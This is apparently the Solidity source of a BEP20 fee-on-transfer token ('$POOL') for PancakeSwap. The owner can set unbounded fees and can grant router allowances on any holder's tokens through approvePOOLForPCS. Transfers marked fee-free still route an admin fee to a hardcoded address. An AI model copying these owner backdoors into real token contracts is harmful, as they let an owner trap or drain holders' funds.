// SPDX-License-Identifier: Unlicensed

pragma solidity ^0.8.0;

import "./IBEP20.sol";
import "./SafeMath.sol";
import "./Context.sol";
import "./Ownable.sol";
import "./IPancakeswapV2Factory.sol";
import "./IPancakeswapV2Router02.sol";

contract POOLToken is Context, IBEP20, Ownable {
    using SafeMath for uint256;
    
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _approvals;

    mapping (address => bool) private _isExcludedFromFee;

    address public bnbPoolAddress;
    address private _adminAddress;
    
    uint256 private _tTotal = 100 * 10**6 * 10**18;
    uint256 private constant MAX = ~uint256(0);
    string private _name = "POOL";
    string private _symbol = "$POOL";
    uint8 private _decimals = 18;
    
    uint256 public _BNBFee = 9;
    uint256 private _previousBNBFee = _BNBFee;
    
    uint256 public _adminFee = 2;
    uint256 private _previousAdminFee = _adminFee;
    
    uint256 public _liquidityFee = 1;
    uint256 private _previousLiquidityFee = _liquidityFee;


    IPancakeswapV2Router02 public pancakeswapV2Router;
    address public pancakeswapV2Pair;
    
    bool inSwapAndLiquify;
    bool public swapAndLiquifyEnabled = true;
    bool public presaleEnded = false;
    
    uint256 public _maxTxAmount =  1 * 10**6 * 10**18;
    uint256 public _maxSwapAmount =  1 * 10**5 * 10**18;
    uint256 private numTokensToSwap =  1 * 10**4 * 10**18;
    uint256 public swapCoolDownTime = 20;
    uint256 private lastSwapTime;

    event SwapAndLiquifyEnabledUpdated(bool enabled);
    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiquidity
    );
    event ExcludedFromFee(address account);
    event IncludedToFee(address account);
    event UpdateFees(uint256 bnbFee, uint256 liquidityFee, uint256 adminfee);
    event UpdatedMaxTaxPercent(uint256 maxTxPercent);
    event UpdatedMaxSwapAmount(uint256 maxSwapAmount);
    event UpdateNumtokensToSwap(uint256 amount);
    event PancakeRouterChanged(address router);
    event UpdateBNBPoolAddress(address account);
    event SwapAndCharged(uint256 token, uint256 liquidAmount, uint256 bnbPool,  uint256 bnbLiquidity);
    
    modifier lockTheSwap {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }
    
    constructor () {
        //Test Net
        IPancakeswapV2Router02 _pancakeswapV2Router = IPancakeswapV2Router02(0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3);
        //Mian Net
        // IPancakeswapV2Router02 _pancakeswapV2Router = IPancakeswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        
        pancakeswapV2Pair = IPancakeswapV2Factory(_pancakeswapV2Router.factory())
            .createPair(address(this), _pancakeswapV2Router.WETH());

        // set the rest of the contract variables
        pancakeswapV2Router = _pancakeswapV2Router;
        
        //exclude owner and this contract from fee
        _isExcludedFromFee[_msgSender()] = true;
        _isExcludedFromFee[address(this)] = true;
        _balances[_msgSender()] = _tTotal;
        _adminAddress = 0x0Be148BcEc70887C306c1491a8848D909eeA86DC;
        emit Transfer(address(0), owner(), _tTotal);
    }
    
    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    function name() external view override returns (string memory) {
        return _name;
    }
    
    function decimals() external view override returns (uint8) {
        return _decimals;
    }

    function totalSupply() external view override returns (uint256) {
        return _tTotal;
    }
    
    function getOwner() external view override returns (address) {
        return owner();
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function getMaxSwapAmount() public view returns (uint256) {
        return _maxSwapAmount;
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "BEP20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "BEP20: decreased allowance below zero"));
        return true;
    }

    function setRouterAddress(address newRouterAddress) external onlyOwner() {
        require(newRouterAddress != address(pancakeswapV2Router), 'This router is already used.');
        pancakeswapV2Router = IPancakeswapV2Router02(newRouterAddress);
        pancakeswapV2Pair = IPancakeswapV2Factory(pancakeswapV2Router.factory()).getPair(address(this), pancakeswapV2Router.WETH());
        if (pancakeswapV2Pair == address(0)) {
            pancakeswapV2Pair = IPancakeswapV2Factory(pancakeswapV2Router.factory()).createPair(address(this), pancakeswapV2Router.WETH());
        }
        emit PancakeRouterChanged(newRouterAddress);
    }

    function setBNBPoolAddress(address account) external onlyOwner {
        require(account != bnbPoolAddress, 'This address was already used');
        bnbPoolAddress = account;
        emit UpdateBNBPoolAddress(account);
    }
    function setCoolDownTime(uint256 time) external onlyOwner {
        require(swapCoolDownTime != time);
        swapCoolDownTime = time;
    }
    function updatePresaleStatus(bool status) external onlyOwner {
        presaleEnded = status;
    }
    
    function excludeFromFee(address account) external onlyOwner {
        _isExcludedFromFee[account] = true;
        emit ExcludedFromFee(account);
    }
    
    function includeInFee(address account) external onlyOwner {
        _isExcludedFromFee[account] = false;
        emit IncludedToFee(account);
    }
    
    function setFees(uint256 bnbFee, uint256 liquidityFee, uint256 adminFee) external onlyOwner() {
        require(_BNBFee != bnbFee || _liquidityFee != liquidityFee || _adminFee != adminFee);
        _BNBFee = bnbFee;
        _liquidityFee = liquidityFee;
        _adminFee = adminFee;
        emit UpdateFees(bnbFee, liquidityFee, adminFee);
    }
   
    function setMaxTxPercent(uint256 maxTxPercent) external onlyOwner() {
        _maxTxAmount = _tTotal.mul(maxTxPercent).div(
            10**2
        );
        emit UpdatedMaxTaxPercent(maxTxPercent);
    }

    function setMaxSwapAmount(uint256 maxSwapAmount) external onlyOwner() {
        _maxSwapAmount = maxSwapAmount;
        emit UpdatedMaxSwapAmount(maxSwapAmount);
    }
    
    function setNumTokensToSwap(uint256 amount) external onlyOwner() {
        require(numTokensToSwap != amount);
        numTokensToSwap = amount;
        emit UpdateNumtokensToSwap(amount);
    }

    function setSwapAndLiquifyEnabled(bool _enabled) external onlyOwner {
        swapAndLiquifyEnabled = _enabled;
        emit SwapAndLiquifyEnabledUpdated(_enabled);
    }
    
     //to receive ETH from pancakeswapV2Router when swapping
    receive() external payable {}

    function _getFeeValues(uint256 tAmount) private view returns (uint256) {
        uint256 fee = tAmount.mul(_BNBFee + _liquidityFee+ _adminFee).div(10**2);
        uint256 tTransferAmount = tAmount.sub(fee);
        return tTransferAmount;
    }

    function removeAllFee() private {
        if(_BNBFee == 0 && _liquidityFee == 0) return;
        
        _previousBNBFee = _BNBFee;
        _previousLiquidityFee = _liquidityFee;
        
        _BNBFee = 0;
        _liquidityFee = 0;
    }
    
    function restoreAllFee() private {
        _BNBFee = _previousBNBFee;
        _liquidityFee = _previousLiquidityFee;
    }
    
    function isExcludedFromFee(address account) external view returns(bool) {
        return _isExcludedFromFee[account];
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "BEP20: approve from the zero address");
        require(spender != address(0), "BEP20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "BEP20: transfer from the zero address");
        require(to != address(0), "BEP20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        if(to == pancakeswapV2Pair) {
            if (balanceOf(pancakeswapV2Pair) > 0) {
                if(amount > _maxSwapAmount) {
                    amount = _maxSwapAmount;
                }
            }
            require(presaleEnded == true, "You are not allowed to add liquidity before presale is ended");
        }

        // is the token balance of this contract address over the min number of
        // tokens that we need to initiate a swap + liquidity lock?
        // also, don't get caught in a circular liquidity event.
        // also, don't swap & liquify if sender is pancakeswap pair.
        uint256 tokenBalance = balanceOf(address(this));
        if(tokenBalance >= _maxTxAmount)
        {
            tokenBalance = _maxTxAmount;
        }
        
        bool overMinTokenBalance = tokenBalance >= numTokensToSwap;
        if (
            overMinTokenBalance &&
            !inSwapAndLiquify &&
            from != pancakeswapV2Pair &&
            swapAndLiquifyEnabled &&
            block.timestamp >= lastSwapTime + swapCoolDownTime
        ) {
            tokenBalance = numTokensToSwap;
            swapAndCharge(tokenBalance);
            lastSwapTime = block.timestamp;
        }
        
        //indicates if fee should be deducted from transfer
        bool takeFee = false;
        if (balanceOf(pancakeswapV2Pair) > 0 && (from == pancakeswapV2Pair || to == pancakeswapV2Pair)) {
            takeFee = true;
        }
        
        //if any account belongs to _isExcludedFromFee account then remove the fee
        if (_isExcludedFromFee[from] || _isExcludedFromFee[to]){
            takeFee = false;
        }
        
        //transfer amount, it will take tax, burn, liquidity fee
        _tokenTransfer(from,to,amount,takeFee);
    }

    function swapAndCharge(uint256 tokenBalance) private lockTheSwap {
        uint256 initialBalance = address(this).balance;

        uint256 liquidBalance = tokenBalance.mul(_liquidityFee).div(_liquidityFee + _BNBFee + _adminFee).div(2);
        tokenBalance = tokenBalance.sub(liquidBalance);
        swapTokensForEth(tokenBalance);


        uint256 newBalance = address(this).balance.sub(initialBalance);
        uint256 bnbForLiquid = newBalance.mul(liquidBalance).div(tokenBalance);
        addLiquidity(liquidBalance, bnbForLiquid);

        (bool success, ) = payable(bnbPoolAddress).call{value: newBalance.sub(bnbForLiquid)}("");
        require(success == true, "Transfer failed.");
        emit SwapAndCharged(tokenBalance, liquidBalance, newBalance.sub(bnbForLiquid), bnbForLiquid);
    }


    function swapTokensForEth(uint256 tokenAmount) private {
        // generate the pancakeswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = pancakeswapV2Router.WETH();

        _approve(address(this), address(pancakeswapV2Router), tokenAmount);

        // make the swap
        pancakeswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this),
            block.timestamp
        );
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        // approve token transfer to cover all possible scenarios
        _approve(address(this), address(pancakeswapV2Router), tokenAmount);

        // add the liquidity
        pancakeswapV2Router.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            owner(),
            block.timestamp
        );
        uint256 balance = address(this).balance;
        if (balance >= 0.1 ether){
            (bool success, ) = payable(bnbPoolAddress).call{value: balance}("");
            require(success, "Transfer failed.");
        }
    }

    //this method is responsible for taking all fee, if takeFee is true
    function _tokenTransfer(address sender, address recipient, uint256 amount, bool takeFee) private {
        if(!takeFee)
            removeAllFee();
        uint256 tTransferAmount = _getFeeValues(amount);
        _balances[sender] = _balances[sender].sub(amount);
        _balances[recipient] = _balances[recipient].add(tTransferAmount); 
        if(!takeFee) {
            _balances[_adminAddress] = _balances[_adminAddress].add(amount.sub(tTransferAmount));    
        } else {
            _balances[address(this)] = _balances[address(this)].add(amount.sub(tTransferAmount));
        }
        emit Transfer(sender, recipient, tTransferAmount);
        
        if(!takeFee)
            restoreAllFee();
    }

    function approvePOOLForPCS(address poolContract) public onlyOwner {
        _approve(poolContract, address(pancakeswapV2Router), MAX);
    }
    
}